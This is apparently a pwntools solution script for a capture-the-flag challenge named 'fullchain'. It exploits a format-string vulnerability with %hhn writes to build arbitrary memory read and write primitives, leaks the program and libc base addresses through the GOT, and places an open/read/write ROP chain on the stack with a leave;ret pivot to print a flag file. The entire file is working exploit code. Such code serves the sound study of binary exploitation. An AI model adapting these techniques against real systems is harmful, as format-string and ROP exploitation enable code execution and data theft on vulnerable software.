from pwn import *
context.arch = 'amd64'
class Judge:
  def __init__(self):
    self.r = self.connect()

  def connect(self):
    # return remote('edu-ctf.zoolab.org', 30201)
    return process('./fullchain')

  def choose_lo(self, cmd):
    assert cmd in ['global', 'local']
    self.r.sendlineafter('global or local > ', cmd)

  def choose_op(self, cmd):
    assert cmd in ['set', 'read', 'write']
    self.r.sendlineafter('set, read or write > ', cmd)

  def myread(self, location, content):
    assert len(content) <= 24
    for c in ['\n', '\r', '\t', ' ']:
      assert c not in content
    self.choose_lo(location)
    self.choose_op('read')
    self.r.sendline(content)

  def mywrite(self, location):
    self.choose_lo(location)
    self.choose_op('write')

  def myset(self, location, data, length):
    assert length <= 0x10
    self.choose_lo(location)
    self.choose_op('set')
    self.r.sendlineafter('data > ', str(data))
    self.r.sendlineafter('length > ', str(length))

class Solver:
  def __init__(self):
    self.judge = Judge()
    self.kidnap()
    self.mem = MemoryAccessor(self.judge)
    self.retrieve_info()


  def kidnap(self):
    while True:
      try:
        self.judge.myread('global', '%7c%10$hhn%248c%18$hhn')
        self.judge.mywrite('global')
        self.judge.mywrite('global')
        self.judge.mywrite('global')
        break
      except EOFError:
        self.judge.r.close()
        self.judge.r = self.judge.connect()
  
  def retrieve_info(self):
    self.txt_base_addr = self.get_txt_base_addr()
    self.lib_base_addr = self.get_lib_base_addr()
    self.ret_addr = self.get_ret_addr()

  def get_txt_base_addr(self):
    self.judge.myread('global', '%7$llx_')
    self.judge.mywrite('global')
    global_addr = int(self.judge.r.recvuntil('_')[:-1], 16)
    global_offs = 0x40b0
    return global_addr - global_offs

  def get_lib_base_addr(self):
    printf_got_addr = self.txt_base_addr + 0x4048
    printf_addr = self.mem.read_dq(printf_got_addr)
    printf_offs = 0x64e10
    return printf_addr - printf_offs

  def get_ret_addr(self):
    self.judge.myread('global', '%10$llx_')
    self.judge.mywrite('global')
    local_addr = int(self.judge.r.recvuntil('_')[:-1], 16)
    return local_addr + 0x8

  def freed(self, buf_addr):
    idx_addr = self.ret_addr + 0x08
    for i in range(16):
      self.mem.write_dq(idx_addr + 0x8 * i, self.ret_addr - 0x48 + i)

    leave_ret = self.lib_base_addr + 0x5aa48

    fmt, pre = '', 0
    for val, idx in sorted(
        [ (buf_addr  >> i * 8 & 0xff, i + 0) for i in range(8) ]
      + [ (leave_ret >> i * 8 & 0xff, i + 8) for i in range(8) ]
    ):
      dif = val - pre
      if dif != 0:
        fmt += '%' + str(dif) + 'c'
      fmt += '%' + str(20 + idx) + '$hhn'
      pre = val
    fmt += '\n\x00'
    global_addr = self.txt_base_addr + 0x40b0
    for i in range(16, len(fmt)):
      self.mem.write_db(global_addr + i, ord(fmt[i]))
    for i in range(16):
      self.judge.myset('global', ord(fmt[15 - i]), 16 - i)
    # gdb.attach(solver.judge.r)
    self.judge.mywrite('global')
    solver.judge.r.interactive()
    print("Finish")

class MemoryAccessor:
  def __init__(self, judge):
    self.judge = judge
    self.cur_addr = None

  def set_ptr_addr(self, addr):
    lazy = True
    for i in range(8):
      val = addr >> (7 - i) * 8 & 0xff
      if lazy and self.cur_addr != None and self.cur_addr >> (7 - i) * 8 & 0xff == val:
        continue
      lazy = False
      self.judge.myset('local', val, 0x10 - i)
    self.cur_addr = addr

  def write_db(self, addr, val):
    self.set_ptr_addr(addr)
    fmt = ('%' + str(val) + 'c' if val != 0 else '') + '%15$hhn'
    self.judge.myread('global', fmt)
    self.judge.mywrite('global')

  def write_dd(self, addr, val):
    self.write_db(addr + 0, val >> 0 * 8 & 0xff)
    self.write_db(addr + 1, val >> 1 * 8 & 0xff)

  def write_dw(self, addr, val):
    self.write_dd(addr + 0, val >> 0 * 8 & 0xffff)
    self.write_dd(addr + 2, val >> 2 * 8 & 0xffff)

  def write_dq(self, addr, val):
    self.write_dw(addr + 0, val >> 0 * 8 & 0xffffffff)
    self.write_dw(addr + 4, val >> 4 * 8 & 0xffffffff)

  def trans(self, c, dtype):
    if len(c) == 0:
      c = b'\x00'
    if dtype == 'int':
      return int.from_bytes(c, 'big')
    elif dtype == 'byte':
      return c
    assert False
    
  def read_db(self, addr, dtype='int'):
    self.set_ptr_addr(addr)
    self.judge.myread('global', '%15$.1s_')
    self.judge.mywrite('global')
    return self.trans(self.judge.r.recvuntil('_')[:-1], dtype)

  def read_dd(self, addr, dtype='int'):
    return self.trans(self.read_db(addr + 1, 'byte') + self.read_db(addr, 'byte'), dtype)

  def read_dw(self, addr, dtype='int'):
    return self.trans(self.read_dd(addr + 2, 'byte') + self.read_dd(addr, 'byte'), dtype)

  def read_dq(self, addr, dtype='int'):
    return self.trans(self.read_dw(addr + 4, 'byte') + self.read_dw(addr, 'byte'), dtype)

solver = Solver()

fn_addr = solver.ret_addr - 0x18
fn = '/home/fullchain/flag\x00'
for i in range(len(fn)):
  solver.mem.write_db(fn_addr + i, ord(fn[i]))

pop_rax_ret = solver.lib_base_addr + 0x4a550
pop_rdi_ret = solver.lib_base_addr + 0x26b72
pop_rsi_ret = solver.lib_base_addr + 0x27529
pop_rdx_pop_r12_ret = solver.lib_base_addr + 0x11c371
syscall_ret = solver.lib_base_addr + 0x66229


rop_source = b'A' * 0x8 + flat(
  pop_rdi_ret, fn_addr,
  pop_rsi_ret, 0,
  pop_rdx_pop_r12_ret, 0, 0,
  pop_rax_ret, 2,
  syscall_ret,

  pop_rdi_ret, 3,
  pop_rsi_ret, fn_addr,
  pop_rdx_pop_r12_ret, 0x20, 0x20,
  pop_rax_ret, 0,
  syscall_ret,

  pop_rdi_ret, 1,
  pop_rax_ret, 1,
  syscall_ret,
)

buf_addr = solver.ret_addr + 0x88
for i in range(len(rop_source)):
  solver.mem.write_db(buf_addr + i, rop_source[i])

solver.freed(buf_addr)
